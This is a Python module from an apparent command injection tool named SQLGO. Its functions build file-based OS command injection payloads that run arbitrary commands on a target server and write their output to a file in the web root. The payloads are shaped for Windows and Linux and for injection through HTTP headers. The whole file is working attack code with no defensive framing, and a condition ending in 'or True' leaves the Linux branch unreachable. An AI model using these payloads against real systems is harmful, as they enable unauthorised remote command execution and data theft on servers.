#!/usr/bin/env python
"""
# SQLGO License - Version 1.4

Copyright (C) 2023-2024 AliMirmohammad

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
import os
import sys
import src.core.setting.setting as settings
def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
  """
  A function that defines file based shell altering payloads.
  """
  if settings.TARGET_OS == settings.OS.WINDOWS or True:
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"open('" + OUTPUT_TEXTFILE + "','w').write('" + TAG + "')\""
    payload = ("%20" +
              "for /f \"tokens=*\" %i in ('cmd /c " +
              python_payload +
              "') do @set /p = %i " + settings.CMD_NUL
              )
  else:
    payload = (separator +
              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\")"
               )

  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True :
    payload = payload.replace("\n", separator)
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")

  return payload


def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
  """
  A function that defines file based cmd altering payloads.
  """
  if settings.TARGET_OS == settings.OS.WINDOWS or True:
    if settings.REVERSE_TCP:
      payload = (separator + cmd + settings.SINGLE_WHITESPACE
                )
    else:
      python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; os.system('" + cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE + "')\""
      payload = (separator +
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do @set /p = %i " + settings.CMD_NUL
                )
  else:
    payload = (separator +
              "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
              )

  # New line fixation
  if settings.USER_AGENT_INJECTION == True or \
     settings.REFERER_INJECTION == True or \
     settings.HOST_INJECTION == True or \
     settings.CUSTOM_HEADER_INJECTION == True:
    payload = payload.replace("\n", separator)
  else:
    if settings.TARGET_OS != settings.OS.WINDOWS:
      payload = payload.replace("\n","%0d")

  return payload
